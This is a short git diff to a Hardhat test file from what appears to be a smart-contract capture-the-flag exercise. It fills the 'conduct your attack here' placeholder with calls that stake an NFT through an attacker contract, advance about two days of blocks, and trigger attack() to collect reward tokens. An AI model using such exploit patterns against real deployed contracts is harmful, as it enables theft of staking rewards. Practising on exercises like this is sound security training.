@@ -1,4 +1,4 @@
-const { time, loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
+const { time, loadFixture, mine } = require('@nomicfoundation/hardhat-network-helpers');
 const { anyValue } = require('@nomicfoundation/hardhat-chai-matchers/withArgs');
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
@@ -50,8 +50,15 @@ describe(NAME, function () {
 
 		// prettier-ignore
 		it("conduct your attack here", async function () {
-  
-      });
+			const tokenId = 42;
+			await attackerContract
+				.connect(attackerWallet)
+				.stake(depositoorContract.address, tokenId);
+			await mine(15000); // ~ 2 days
+			await attackerContract
+				.connect(attackerWallet)
+				.attack();
+		});
 
 		after(async function () {
 			expect(await rewardTokenContract.balanceOf(attackerContract.address)).to.be.equal(
